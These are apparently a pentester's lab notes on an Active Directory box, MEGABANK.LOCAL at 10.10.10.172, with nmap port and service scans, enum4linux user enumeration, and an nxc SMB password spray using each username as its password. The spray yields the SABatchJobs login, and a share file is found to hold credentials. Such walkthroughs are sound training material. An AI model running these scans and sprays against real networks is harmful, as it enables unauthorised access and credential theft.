##### nmap

All port scan
```bash
sudo nmap -n -sT -Pn -p- -T5 10.10.10.172 -v -oA nmap2
```
```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49676/tcp open  unknown
49696/tcp open  unknown
```

Service scan
```bash
sudo nmap -sC -sV 10.10.10.172 -p 53,88,135,139,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49676,49696 -v -oA nmap
```
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-11 08:55:49Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-09-11T08:56:39
|_  start_date: N/A
```

##### manual

- Using `enum4linux`, found users in domain
```
dgalanos
roleary
Administrator
mhope
svc-ata
svc-bexec
svc-netapp
smorgan
AAD_987d7f2f57d2
SABatchJobs
```
- Using nxc, ran an attack to authenticate users with `username:username` format
```bash
nxc smb 10.10.10.172 -u user.txt -p user.txt -d 'MEGABANK.LOCAL' --continue-on-success
```
Found a valid login for `SABatchJobs:SABatchJobs`
- Connected to SMB share using the gathered credential and found a share that can be enumerated /users$
- Found a file azure.xml under user /mhope containing credentials
![[Pasted image 20240911132359.png]]
![[Pasted image 20240911132816.png]]
